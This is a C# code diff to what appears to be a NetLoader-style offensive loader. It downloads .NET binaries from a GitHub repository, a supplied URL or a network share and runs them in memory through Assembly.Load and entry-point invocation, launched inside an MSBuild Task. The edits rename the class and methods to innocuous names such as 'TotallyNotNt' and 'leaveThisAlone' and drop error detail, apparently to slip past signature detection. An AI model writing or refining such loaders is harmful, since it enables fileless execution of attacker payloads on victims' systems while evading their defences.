@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Net;
 using System.Text;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
@@ -11,7 +12,7 @@ using System.Text.RegularExpressions;
 //using Microsoft.Build.Utilities;
 public class TotallyNotNt
 {
-    static WebClient webClient = new WebClient() { };
+    static WebClient leaveMeAlone = new WebClient() { };
     static string _repURL = "https://github.com/Flangvik/NetLoader/tree/master/Binaries";
 
     public static void Main(string[] args)
@@ -69,7 +70,8 @@ public class TotallyNotNt
 
                     Console.WriteLine("[+] Provide arguments for {0} >", binUrl);
                     string binArgs = Console.ReadLine();
-                    invokeBinary("", binArgs, binUrl, false);
+                    leaveThisAlone("", binArgs, binUrl, false);
+					
 
 
                 }
@@ -81,7 +83,8 @@ public class TotallyNotNt
                 {
                     Console.WriteLine("[+] Provide arguments for {0} >", binList[Convert.ToInt32(rawInput) - 1]);
                     string binArgs = Console.ReadLine();
-                    invokeBinary(binList[Convert.ToInt32(rawInput) - 1], binArgs);
+                    leaveThisAlone(binList[Convert.ToInt32(rawInput) - 1], binArgs);
+					
                 }
 
             }
@@ -89,53 +92,53 @@ public class TotallyNotNt
             {
                 Console.WriteLine("[!] Damn, it failed, to bad");
                 Console.WriteLine("[!] {0}", ex.Message);
-                Console.WriteLine("[!] {0}", ex.InnerException);
+             
             }
         }
     }
 
 
 
-    public static void invokeBinary(string binName, string arguments = "", string customUrl = "", bool gitHub = true)
+    public static void leaveThisAlone(string binName, string arguments = "", string customUrl = "", bool randomStuff = true)
     {
-        byte[] binarySource = new byte[] { };
-
-        if (gitHub)
+	
+		   
+        if (!randomStuff)
         {
-            binarySource = webClient.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true");
+            if (!customUrl.StartsWith("http") && customUrl.StartsWith("\\\\"))
+            {
+				var foo = Assembly.Load(File.ReadAllBytes(customUrl));
+				testMe(foo,arguments);
+               
+            }
+            
+			if(customUrl.StartsWith("http") && !customUrl.StartsWith("\\\\"))
+            {
+              var foo = Assembly.Load(leaveMeAlone.DownloadData(customUrl));
+			  testMe(foo,arguments);
+            }
         }
         else
         {
-            if (customUrl.StartsWith("http") && !customUrl.StartsWith("\\\\"))
-            {
-                binarySource = webClient.DownloadData(customUrl);
-            }
-            else
-            {
-                binarySource = File.ReadAllBytes(customUrl);
-
-            }
-
+			var foo = Assembly.Load(leaveMeAlone.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true"));
+			testMe(foo,arguments);
         }
 
-		invokeBinary(binarySource,arguments);
 
-     
+		
     }
 	
-	 public static void invokeBinary(byte[] loadMe, string arguments)
-    {	  
-		   var barFoo = new object[] { new string[] { arguments } };
-		   var fooBar = System.Reflection.Assembly.Load(loadMe);
-		   fooBar.EntryPoint.Invoke(0, barFoo);
-
+	public static void testMe(Assembly fooBarFinally, string args){
+		var barFoo = new object[] { new string[] { args } };
+		
+		fooBarFinally.EntryPoint.Invoke(0, barFoo);
 	}
 	
     public static List<string> GetBins()
     {
      
         var avBinaries = new List<string>() { };
-        var websiteSource = webClient.DownloadString(_repURL);
+        var websiteSource = leaveMeAlone.DownloadString(_repURL);
 
         Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
         foreach (var match in rgx.Matches(websiteSource))
@@ -184,7 +187,7 @@ public class TotallyNotNt
         catch (Exception ex)
         {
             Console.WriteLine("[!] {0}", ex.Message);
-            Console.WriteLine("[!] {0}", ex.InnerException);
+            
         }
     }
 
@@ -209,7 +212,7 @@ public class ClassExample : Task, ITask
 {
     public override bool Execute()
     {
-        NetLoader.Main(new string[] { });
+        TotallyNotNt.Main(new string[] { });
         return true;
     }
 }
